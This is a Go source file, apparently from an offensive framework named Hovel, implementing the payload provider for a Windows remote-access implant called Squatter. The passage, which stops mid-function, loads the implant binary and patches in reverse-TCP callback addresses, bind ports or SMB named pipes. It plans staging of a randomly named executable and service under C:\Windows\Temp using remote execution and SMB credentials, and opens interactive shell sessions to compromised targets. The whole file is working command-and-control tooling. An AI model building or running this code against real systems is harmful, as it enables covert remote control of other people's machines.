// Command squatter-provider is the Hovel payload_provider module for Squatter.
//
// The provider exposes Squatter payload metadata and packages the Windows agent
// binary built from payloads/squatter/windows/src.
package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"unicode/utf16"

	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/shell"
	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
)

const (
	version      = "v0.1.0"
	payloadName  = "squatter"
	platform     = "windows"
	arch         = "x86"
	minOS        = "windows-7"
	formatPEEXE  = "pe-exe"
	reverseTCP   = "reverse-tcp"
	smbNamedPipe = "smb-named-pipe"
	tcpBind      = "tcp-bind"
	tcpCallback  = "tcp-callback"

	payloadEnvPath = "SQUATTER_PAYLOAD_PATH"
	payloadRunfile = "payloads/squatter/windows/squatter.exe"

	payloadConfigMagic          = "SQCFG001"
	payloadConfigKindOffset     = 8
	payloadConfigHostOffset     = 12
	payloadConfigPortOffset     = 16
	payloadConfigPipeOffset     = 18
	payloadConfigPipeCharacters = 128
	payloadConfigKindReverseTCP = 1
	payloadConfigKindSMBPipe    = 2
	payloadConfigKindTCPBind    = 3
)

// Provider implements Hovel's payload_provider contract for Squatter.
type Provider struct {
	lp listeningPost
}

func newProvider() Provider {
	return Provider{lp: newPlaceholderLP()}
}

func (p Provider) listeningPost() listeningPost {
	if p.lp == nil {
		return newPlaceholderLP()
	}
	return p.lp
}

func (Provider) Info() hovel.Info {
	return hovel.Info{
		Name:        payloadName,
		Version:     version,
		Type:        hovel.TypePayloadProvider,
		Summary:     "Build Squatter Windows payload artifacts.",
		Description: "Core Hovel payload provider for Squatter.",
		Tags:        []string{"payload_provider", "squatter", "windows", "lab", "dangerous"},
	}
}

func (Provider) Schema() hovel.Schema {
	return hovel.Schema{
		ChainConfig: []hovel.Requirement{
			enumReq("payload.transport", "Payload transport.", tcpBind, tcpCallback, smbNamedPipe, reverseTCP),
			enumReq("payload.format", "Payload artifact format.", formatPEEXE),
			hovel.Req("payload.lhost", "host", "TCP callback listener host."),
			hovel.Req("payload.lport", "port", "TCP callback listener port."),
			hovel.Req("payload.bind_port", "port", "TCP bind port opened by the payload on the target."),
			hovel.Req("payload.pipe", "string", "SMB named pipe for post-throw Squatter comms."),
		},
		Outputs: map[string]any{
			"payloads": "per-target Squatter payload artifact set",
		},
	}
}

func enumReq(key, description string, allowed ...string) hovel.Requirement {
	req := hovel.Req(key, "enum", description)
	req.Allowed = allowed
	return req
}

func (p Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
	config := stringConfigFromContext(ctx)
	if config["payload.transport"] == "" {
		config["payload.transport"] = tcpBind
	}
	transport := canonicalTransport(config["payload.transport"])
	target := firstNonEmpty(config["target.host"], ctx.Target)
	ctx.Log.Info("connecting to Squatter session", "target", target, "transport", transport)
	lp := p.listeningPost()
	session, err := lp.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     ctx.RunID,
		Target:    target,
		PayloadID: "squatter/windows/x86/windows-7/" + transport + "/pe-exe",
		Config:    config,
	})
	if err != nil {
		ctx.Log.Warn("Squatter session connection failed", "target", target, "error", err.Error())
		return hovel.Failed(
			"Squatter installed but session connection failed",
			hovel.WithFindings(hovel.Finding{
				Title:    "Squatter session connection failed",
				Severity: "high",
				Detail:   err.Error(),
			}),
		), nil
	}
	result := hovel.Ok(
		map[string]any{"target": target, "sessionId": session.ID, "transport": session.Transport},
		hovel.WithSummary("Squatter session connected"),
	)
	if transport == tcpBind {
		if placeholder, ok := lp.(*placeholderLP); ok {
			if conn, ok := placeholder.tcpBindConn(target); ok {
				ref, err := ctx.OpenSession(
					&hovel.PTYSession{Frontend: func(input io.Reader, output io.Writer) error {
						shell.New(conn).Run(input, output)
						return nil
					}},
					hovel.WithName("Squatter session"),
					hovel.WithKind("agent"),
					hovel.WithTransport("squatter/tcp-bind"),
					hovel.WithCapabilities(capabilities()...),
				)
				if err != nil {
					return hovel.Result{}, err
				}
				result.Sessions = append(result.Sessions, ref)
				return result, nil
			}
		}
	}
	result.Sessions = append(result.Sessions, session)
	return result, nil
}

func stringConfigFromContext(ctx *hovel.Context) map[string]string {
	config := map[string]string{}
	for key, value := range ctx.ChainConfig {
		if text, ok := value.(string); ok {
			config[key] = text
		}
	}
	for key, value := range ctx.TargetConfig {
		if text, ok := value.(string); ok {
			config[key] = text
		}
	}
	return config
}

func (Provider) DescribeSteps() (hovel.StepContractSet, error) {
	return hovel.StepContractSet{
		Version: "squatter-provider/v1",
		Steps: []hovel.StepContract{
			{
				ID:   "squatter.generate",
				Kind: "payload.generate",
				ConfigSchema: map[string]any{
					"type": "object",
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityPayloadArtifact, map[string]any{"provider": payloadName}),
				},
			},
			{
				ID:   "squatter.install_smb",
				Kind: "payload.install",
				Requires: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityRemoteExecution, nil),
					capability(hovel.CapabilityCredential, map[string]any{"protocol": "smb"}),
					capability(hovel.CapabilityPayloadArtifact, map[string]any{"provider": payloadName}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": smbNamedPipe}),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "smb-pipe"}),
					capability(hovel.CapabilityCleanupHandle, map[string]any{"owner": payloadName}),
				},
				Prepare: hovel.StepPrepareContract{Materializes: []string{"staged_path", "service_name", "pipe_name"}},
			},
			{
				ID:   "squatter.connect_smb",
				Kind: "session.connector",
				Requires: []hovel.CapabilityRequirement{
					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": smbNamedPipe}, "installed", "disconnected", "installed_unconnected"),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "smb-pipe"}),
					capabilityWithStates(hovel.CapabilityCredential, map[string]any{"protocol": "smb"}, "active"),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": smbNamedPipe}),
				},
			},
			{
				ID:   "squatter.install_tcp_bind",
				Kind: "payload.install",
				Requires: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityRemoteExecution, nil),
					capability(hovel.CapabilityPayloadArtifact, map[string]any{"provider": payloadName}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": tcpBind}),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-endpoint"}),
					capability(hovel.CapabilityCleanupHandle, map[string]any{"owner": payloadName}),
				},
				Prepare: hovel.StepPrepareContract{Materializes: []string{"staged_path", "service_name", "bind_host", "bind_port"}},
			},
			{
				ID:   "squatter.connect_tcp_bind",
				Kind: "session.connector",
				Requires: []hovel.CapabilityRequirement{
					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": tcpBind}, "installed", "disconnected", "installed_unconnected"),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-endpoint"}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": tcpBind}),
				},
			},
			{
				ID:   "squatter.listen_tcp_callback",
				Kind: "listener.start",
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-listener"}),
					capability(hovel.CapabilityCleanupHandle, map[string]any{"owner": payloadName}),
				},
				Prepare: hovel.StepPrepareContract{Materializes: []string{"listen_host", "listen_port"}},
			},
			{
				ID:   "squatter.install_tcp_callback",
				Kind: "payload.install",
				Requires: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityRemoteExecution, nil),
					capability(hovel.CapabilityPayloadArtifact, map[string]any{"provider": payloadName}),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-listener"}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": tcpCallback}),
					capability(hovel.CapabilityCleanupHandle, map[string]any{"owner": payloadName}),
				},
				Prepare: hovel.StepPrepareContract{Materializes: []string{"staged_path", "service_name"}},
			},
			{
				ID:   "squatter.connect_tcp_callback",
				Kind: "session.connector",
				Requires: []hovel.CapabilityRequirement{
					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": tcpCallback}, "installed", "disconnected", "installed_unconnected"),
					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-listener"}),
				},
				Produces: []hovel.CapabilityRequirement{
					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": tcpCallback}),
				},
			},
		},
	}, nil
}

func capability(capabilityType hovel.CapabilityType, attributes map[string]any) hovel.CapabilityRequirement {
	return capabilityWithStates(capabilityType, attributes)
}

func capabilityWithStates(capabilityType hovel.CapabilityType, attributes map[string]any, states ...string) hovel.CapabilityRequirement {
	return hovel.CapabilityRequirement{
		Type:          capabilityType,
		SchemaVersion: "v1",
		Attributes:    attributes,
		States:        states,
	}
}

func (Provider) PrepareStep(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	if req.StepID == "squatter.install_smb" {
		return prepareSMBInstall(req)
	}
	if req.StepID == "squatter.install_tcp_bind" {
		return prepareTCPBindInstall(req)
	}
	if req.StepID == "squatter.listen_tcp_callback" {
		return prepareTCPCallbackListener(req)
	}
	if req.StepID == "squatter.install_tcp_callback" {
		return prepareTCPCallbackInstall(req)
	}
	return hovel.StepPrepareResult{
		PreparedValues: map[string]hovel.PreparedValue{},
		OperatorSummary: hovel.OperatorSummary{
			Warnings: []string{"squatter step preparation is not implemented yet"},
		},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_prepare_not_implemented",
			Level:        "warning",
			Kind:         "step.prepare.not_implemented",
			SourceStepID: req.StepID,
			Message:      "squatter step preparation is not implemented yet",
		}},
	}, nil
}

func prepareTCPBindInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	stagedPath, serviceName, err := preparedInstallNames(req)
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	bindPort, err := preparedString(req.ExistingPreparedValues, "bind_port", func() (string, error) {
		if port, ok := stringConfig(req.Config, "payload.bind_port"); ok && port != "" {
			return port, nil
		}
		return "9100", nil
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			payloadInstanceCapability(req.StepID, tcpBind, "cap_payload_instance_tcp_bind_"+serviceName, stagedPath, serviceName),
			{
				ID:             "cap_endpoint_tcp_bind_" + serviceName,
				Type:           hovel.CapabilityTransport,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"kind": "tcp-endpoint",
					"port": bindPort,
				},
			},
			cleanupCapability(req.StepID, "cap_cleanup_"+serviceName, stagedPath, serviceName),
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: stagedPath, Editable: true},
			"service_name": {Value: serviceName, Editable: true},
			"bind_port":    {Value: bindPort, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{
				stagedPath,
				"service " + serviceName,
				"TCP bind port " + bindPort,
			},
		},
	}, nil
}

func prepareTCPCallbackListener(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	host, _ := stringConfig(req.Config, "payload.lhost")
	if host == "" {
		host = "127.0.0.1"
	}
	port, _ := stringConfig(req.Config, "payload.lport")
	if port == "" {
		port = "0"
	}
	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			{
				ID:             "cap_listener_tcp_callback_" + sanitizeCapabilitySuffix(host+"_"+port),
				Type:           hovel.CapabilityTransport,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"kind": "tcp-listener",
					"host": host,
					"port": port,
				},
			},
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"listen_host": {Value: host, Editable: true},
			"listen_port": {Value: port, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{"callback to " + net.JoinHostPort(host, port)},
		},
	}, nil
}

func prepareTCPCallbackInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	stagedPath, serviceName, err := preparedInstallNames(req)
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			payloadInstanceCapability(req.StepID, tcpCallback, "cap_payload_instance_tcp_callback_"+serviceName, stagedPath, serviceName),
			cleanupCapability(req.StepID, "cap_cleanup_"+serviceName, stagedPath, serviceName),
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: stagedPath, Editable: true},
			"service_name": {Value: serviceName, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{
				stagedPath,
				"service " + serviceName,
				"TCP callback",
			},
		},
	}, nil
}

func preparedInstallNames(req hovel.StepPrepareRequest) (string, string, error) {
	stagedPath, err := preparedString(req.ExistingPreparedValues, "staged_path", func() (string, error) {
		token, err := randomToken(6)
		if err != nil {
			return "", err
		}
		return `C:\Windows\Temp\` + token + ".exe", nil
	})
	if err != nil {
		return "", "", err
	}
	serviceName, err := preparedString(req.ExistingPreparedValues, "service_name", func() (string, error) {
		return randomToken(5)
	})
	if err != nil {
		return "", "", err
	}
	return stagedPath, serviceName, nil
}

func payloadInstanceCapability(stepID, transport, id, stagedPath, serviceName string) hovel.Capability {
	return hovel.Capability{
		ID:             id,
		Type:           hovel.CapabilityPayloadInstance,
		SchemaVersion:  "v1",
		State:          "planned",
		ProducerStepID: stepID,
		Attributes: map[string]any{
			"provider":     payloadName,
			"transport":    transport,
			"staged_path":  stagedPath,
			"service_name": serviceName,
		},
	}
}

func cleanupCapability(stepID, id, stagedPath, serviceName string) hovel.Capability {
	return hovel.Capability{
		ID:             id,
		Type:           hovel.CapabilityCleanupHandle,
		SchemaVersion:  "v1",
		State:          "planned",
		ProducerStepID: stepID,
		Attributes: map[string]any{
			"owner":        payloadName,
			"staged_path":  stagedPath,
			"service_name": serviceName,
		},
	}
}

func stringConfig(values map[string]any, key string) (string, bool) {
	value, ok := values[key]
	if !ok {
		return "", false
	}
	text, ok := value.(string)
	return text, ok
}

func sanitizeCapabilitySuffix(value string) string {
	replacer := strings.NewReplacer(":", "_", ".", "_", "/", "_", "\\", "_", "[", "_", "]", "_")
	return replacer.Replace(value)
}

func prepareSMBInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
	stagedPath, err := preparedString(req.ExistingPreparedValues, "staged_path", func() (string, error) {
		token, err := randomToken(6)
		if err != nil {
			return "", err
		}
		return `C:\Windows\Temp\` + token + ".exe", nil
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	serviceName, err := preparedString(req.ExistingPreparedValues, "service_name", func() (string, error) {
		return randomToken(5)
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}
	pipeName, err := preparedString(req.ExistingPreparedValues, "pipe_name", func() (string, error) {
		return randomToken(6)
	})
	if err != nil {
		return hovel.StepPrepareResult{}, err
	}

	return hovel.StepPrepareResult{
		PlannedOutputs: []hovel.Capability{
			{
				ID:             "cap_payload_instance_" + pipeName,
				Type:           hovel.CapabilityPayloadInstance,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"provider":     payloadName,
					"transport":    smbNamedPipe,
					"staged_path":  stagedPath,
					"service_name": serviceName,
				},
			},
			{
				ID:             "cap_endpoint_smb_pipe_" + pipeName,
				Type:           hovel.CapabilityTransport,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"kind":      "smb-pipe",
					"pipe_name": pipeName,
				},
			},
			{
				ID:             "cap_cleanup_" + serviceName,
				Type:           hovel.CapabilityCleanupHandle,
				SchemaVersion:  "v1",
				State:          "planned",
				ProducerStepID: req.StepID,
				Attributes: map[string]any{
					"owner":        payloadName,
					"staged_path":  stagedPath,
					"service_name": serviceName,
				},
			},
		},
		PreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: stagedPath, Editable: true},
			"service_name": {Value: serviceName, Editable: true},
			"pipe_name":    {Value: pipeName, Editable: true},
		},
		OperatorSummary: hovel.OperatorSummary{
			TargetSideArtifacts: []string{
				stagedPath,
				"service " + serviceName,
				`\\.\pipe\` + pipeName,
			},
		},
	}, nil
}

func preparedString(values map[string]hovel.PreparedValue, key string, generate func() (string, error)) (string, error) {
	if values != nil {
		if existing, ok := values[key]; ok {
			if text, ok := existing.Value.(string); ok && text != "" {
				return text, nil
			}
		}
	}
	return generate()
}

func randomToken(byteCount int) (string, error) {
	buf := make([]byte, byteCount)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}

func (p Provider) ExecuteStep(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
	switch req.StepID {
	case "squatter.listen_tcp_callback":
		return p.executeTCPCallbackListen(req)
	case "squatter.connect_tcp_bind":
		return p.executeTCPConnect(req, tcpBind)
	case "squatter.connect_tcp_callback":
		return p.executeTCPConnect(req, tcpCallback)
	case "squatter.connect_smb":
		return p.executeSMBConnect(req)
	}
	return hovel.StepExecuteResult{
		Status: "failed",
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_execute_not_implemented",
			Level:        "warning",
			Kind:         "step.execute.not_implemented",
			SourceStepID: req.StepID,
			Message:      "squatter step execution is not implemented yet",
		}},
	}, nil
}

func (p Provider) executeTCPCallbackListen(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
	config := stringMapFromAny(req.RunMetadata["config"])
	target := firstNonEmpty(config["target.host"], "target")
	listener, err := p.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     req.RunID,
		Target:    target,
		PayloadID: "squatter/windows/x86/windows-7/tcp-callback/pe-exe",
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "listener_failed",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_tcp_callback_listen_failed",
				Level:        "warning",
				Kind:         "listener.start.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter TCP callback listener failed",
				Details:      map[string]any{"error": err.Error()},
			}},
		}, nil
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Capabilities: []hovel.Capability{{
			ID:             "cap_listener_" + sanitizeCapabilitySuffix(listener.ID),
			Type:           hovel.CapabilityTransport,
			SchemaVersion:  "v1",
			State:          "active",
			ProducerStepID: req.StepID,
			Attributes: map[string]any{
				"kind":       "tcp-listener",
				"listenerId": listener.ID,
				"host":       listener.Host,
				"port":       strconv.Itoa(listener.Port),
				"transport":  tcpCallback,
			},
		}},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_tcp_callback_listening",
			Level:        "info",
			Kind:         "listener.start",
			SourceStepID: req.StepID,
			Message:      "Squatter TCP callback listener started",
			Details: map[string]any{
				"listenerId": listener.ID,
				"address":    net.JoinHostPort(listener.Host, strconv.Itoa(listener.Port)),
			},
		}},
	}, nil
}

func (p Provider) executeTCPConnect(req hovel.StepExecuteRequest, transport string) (hovel.StepExecuteResult, error) {
	config := stringMapFromAny(req.RunMetadata["config"])
	if config == nil {
		config = map[string]string{}
	}
	config["payload.transport"] = transport
	target := firstNonEmpty(config["target.host"], config["tcp.host"], config["smb.host"])
	session, err := p.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     req.RunID,
		Target:    target,
		PayloadID: "squatter/windows/x86/windows-7/" + transport + "/pe-exe",
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "installed_unconnected",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_" + strings.ReplaceAll(transport, "-", "_") + "_connect_failed",
				Level:        "warning",
				Kind:         "session.connect.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter " + transport + " session connection failed",
				Details:      map[string]any{"error": err.Error()},
			}},
		}, nil
	}
	state := "active"
	if session.State != "open" {
		state = session.State
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Capabilities: []hovel.Capability{{
			ID:             "cap_session_" + session.ID,
			Type:           hovel.CapabilitySessionRef,
			SchemaVersion:  "v1",
			State:          state,
			ProducerStepID: req.StepID,
			Attributes: map[string]any{
				"provider":  payloadName,
				"transport": transport,
				"sessionId": session.ID,
				"target":    session.Target,
			},
		}},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_" + strings.ReplaceAll(transport, "-", "_") + "_connect",
			Level:        "info",
			Kind:         "session.connect",
			SourceStepID: req.StepID,
			Message:      "Squatter " + transport + " session connected",
			Details: map[string]any{
				"sessionId": session.ID,
				"target":    session.Target,
				"transport": session.Transport,
				"state":     session.State,
			},
		}},
	}, nil
}

func (p Provider) executeSMBConnect(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
	config := stringMapFromAny(req.RunMetadata["config"])
	session, err := p.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     req.RunID,
		Target:    firstNonEmpty(config["target.host"], config["smb.host"]),
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "installed_unconnected",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_connect_smb_failed",
				Level:        "warning",
				Kind:         "session.connect.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter SMB session connection failed",
				Details: map[string]any{
					"error": err.Error(),
				},
			}},
		}, nil
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Capabilities: []hovel.Capability{{
			ID:             "cap_session_" + session.ID,
			Type:           hovel.CapabilitySessionRef,
			SchemaVersion:  "v1",
			State:          "active",
			ProducerStepID: req.StepID,
			Attributes: map[string]any{
				"provider":  payloadName,
				"transport": smbNamedPipe,
				"sessionId": session.ID,
				"target":    session.Target,
			},
		}},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_connect_smb_open",
			Level:        "info",
			Kind:         "session.connect",
			SourceStepID: req.StepID,
			Message:      "Squatter SMB session connected",
			Details: map[string]any{
				"sessionId": session.ID,
				"target":    session.Target,
				"transport": session.Transport,
			},
		}},
	}, nil
}

func stringMapFromAny(value any) map[string]string {
	object, ok := value.(map[string]any)
	if !ok {
		return nil
	}
	out := make(map[string]string, len(object))
	for key, item := range object {
		if text, ok := item.(string); ok {
			out[key] = text
		}
	}
	return out
}

func (Provider) CleanupStep(req hovel.StepCleanupRequest) (hovel.StepCleanupResult, error) {
	return hovel.StepCleanupResult{
		Status: "cleanup_attempted_unverified",
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_cleanup_not_implemented",
			Level:        "warning",
			Kind:         "step.cleanup.not_implemented",
			SourceStepID: req.StepID,
			Message:      "squatter step cleanup is not implemented yet",
		}},
	}, nil
}

func (Provider) ListPayloads(query hovel.PayloadQuery) ([]hovel.PayloadInfo, error) {
	transport := query.Transport
	if transport == "" {
		return []hovel.PayloadInfo{
			payloadInfo(tcpBind),
			payloadInfo(tcpCallback),
			payloadInfo(smbNamedPipe),
		}, nil
	}
	return []hovel.PayloadInfo{payloadInfo(canonicalTransport(transport))}, nil
}

func (Provider) ResolvePayload(query hovel.PayloadQuery) (hovel.PayloadInfo, error) {
	transport := query.Transport
	if transport == "" {
		return hovel.PayloadInfo{}, fmt.Errorf("payload transport is required")
	}
	return payloadInfo(canonicalTransport(transport)), nil
}

func (p Provider) PrepareListener(req hovel.PrepareListenerRequest) (hovel.ListenerRef, error) {
	return p.listeningPost().PrepareListener(req)
}

func (Provider) GeneratePayload(req hovel.GeneratePayloadRequest) (hovel.PayloadArtifactSet, error) {
	body, err := loadPayloadBinary()
	if err != nil {
		return hovel.PayloadArtifactSet{}, err
	}
	body = append([]byte(nil), body...)
	if err := patchPayloadConfig(body, req); err != nil {
		return hovel.PayloadArtifactSet{}, err
	}
	sum := sha256.Sum256(body)
	artifact := hovel.PayloadArtifact{
		Name:     "squatter.exe",
		Role:     "primary",
		Format:   formatPEEXE,
		Encoding: "base64",
		Bytes:    base64.StdEncoding.EncodeToString(body),
		Size:     int64(len(body)),
		SHA256:   hex.EncodeToString(sum[:]),
	}
	return hovel.PayloadArtifactSet{
		Primary:   artifact,
		Artifacts: []hovel.PayloadArtifact{artifact},
	}, nil
}

func patchPayloadConfig(body []byte, req hovel.GeneratePayloadRequest) error {
	offset := strings.Index(string(body), payloadConfigMagic)
	if offset < 0 {
		return fmt.Errorf("squatter payload config marker %q not found", payloadConfigMagic)
	}
	if len(body) < offset+payloadConfigPipeOffset+(payloadConfigPipeCharacters*2) {
		return fmt.Errorf("squatter payload config blob is truncated")
	}

	transport := req.Config["payload.transport"]
	if transport == "" {
		if strings.Contains(req.PayloadID, "/"+smbNamedPipe+"/") {
			transport = smbNamedPipe
		} else if strings.Contains(req.PayloadID, "/"+tcpBind+"/") {
			transport = tcpBind
		} else {
			transport = tcpCallback
		}
	}
	transport = canonicalTransport(transport)

	switch transport {
	case tcpCallback:
		return patchReverseTCPConfig(body[offset:], req)
	case tcpBind:
		return patchTCPBindConfig(body[offset:], req)
	case smbNamedPipe:
		return patchNamedPipeConfig(body[offset:], req)
	default:
		return fmt.Errorf("unsupported squatter transport %q", transport)
	}
}

func patchTCPBindConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	portText := firstNonEmpty(req.Config["payload.bind_port"], req.Config["payload.port"])
	if portText == "" {
		portText = "9100"
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return fmt.Errorf("payload.bind_port must be a TCP port: %q", portText)
	}
	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindTCPBind)
	binary.LittleEndian.PutUint16(config[payloadConfigPortOffset:], uint16(port))
	return nil
}

func patchReverseTCPConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	host := req.Config["payload.lhost"]
	portText := req.Config["payload.lport"]
	if req.Listener != nil {
		if req.Listener.Host != "" {
			host = req.Listener.Host
		}
		if req.Listener.Port != 0 {
			portText = strconv.Itoa(req.Listener.Port)
		}
	}
	if host == "" {
		host = "127.0.0.1"
	}
	if portText == "" {
		portText = "4444"
	}

	ip := net.ParseIP(host).To4()
	if ip == nil {
		return fmt.Errorf("payload.lhost must be an IPv4 literal for the current Squatter runtime: %q", host)
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return fmt.Errorf("payload.lport must be a TCP port: %q", portText)
	}

	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindReverseTCP)
	copy(config[payloadConfigHostOffset:payloadConfigHostOffset+4], ip)
	binary.LittleEndian.PutUint16(config[payloadConfigPortOffset:], uint16(port))
	return nil
}

func patchNamedPipeConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	pipe := normalizeNamedPipe(req.Config["payload.pipe"])

	encoded := utf16.Encode([]rune(pipe))
	if len(encoded) >= payloadConfigPipeCharacters {
		return fmt.Errorf("payload.pipe is too long for Squatter config")
	}

	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindSMBPipe)
	for index := 0; index < payloadConfigPipeCharacters; index++ {
		value := uint16(0)
		if index < len(encoded) {
			value = encoded[index]
		}
		binary.LittleEndian.PutUint16(
			config[payloadConfigPipeOffset+(index*2):],
			value,
		)
	}
	return nil
}

func normalizeNamedPipe(pipe string) string {
	if pipe == "" {
		return `\\.\pipe\squatter`
	}
	if strings.HasPrefix(pipe, `\\.\pipe\`) {
		return pipe
	}
	if strings.HasPrefix(pipe, `\\`) {
		parts := strings.Split(pipe, `\`)
		if len(parts) >= 5 && strings.EqualFold(parts[3], "pipe") && parts[4] != "" {
			return `\\.\pipe\` + strings.Join(parts[4:], `\`)
		}
	}
	pipe = strings.TrimLeft(pipe, `\`)
	return `\\.\pipe\` + pipe
}

func loadPayloadBinary() ([]byte, error) {
	var candidates []string

	if explicit := os.Getenv(payloadEnvPath); explicit != "" {
		candidates = append(candidates, explicit)
	}

	if runfiles := os.Getenv("RUNFILES_DIR"); runfiles != "" {
		candidates = appendRunfileCandidates(candidates, runfiles)
	}

	if exe, err := os.Executable(); err == nil {
		candidates = appendRunfileCandidates(candidates, exe+".runfiles")
	}

	candidates = append(candidates,
		filepath.Join("bazel-bin", payloadRunfile),
		filepath.Join("payloads", "squatter", "windows", "squatter.exe"),
	)

	for _, candidate := range candidates {
		body, err := os.ReadFile(candidate)
		if err == nil {
			return body, nil
		}
	}

	return nil, fmt.Errorf("squatter payload binary not found; set %s or run through Bazel runfiles", payloadEnvPath)
}

func appendRunfileCandidates(candidates []string, root string) []string {
	return append(candidates,
		filepath.Join(root, "_main", payloadRunfile),
		filepath.Join(root, "hovel", payloadRunfile),
		filepath.Join(root, payloadRunfile),
	)
}

func (p Provider) ConnectSession(req hovel.ConnectSessionRequest) (hovel.SessionRef, error) {
	return p.listeningPost().ConnectSession(req)
}

func (p Provider) CleanupPayload(req hovel.CleanupPayloadRequest) (hovel.CleanupResult, error) {
	return p.listeningPost().Cleanup(req)
}

func (Provider) ReadPayloadChunk(req hovel.ReadPayloadChunkRequest) (hovel.PayloadChunk, error) {
	return hovel.PayloadChunk{
		Handle:   req.Handle,
		Offset:   req.Offset,
		Data:     "",
		EOF:      true,
		Encoding: "base64",
	}, nil
}

func payloadInfo(transport string) hovel.PayloadInfo {
	transport = canonicalTransport(transport)
	info := hovel.PayloadInfo{
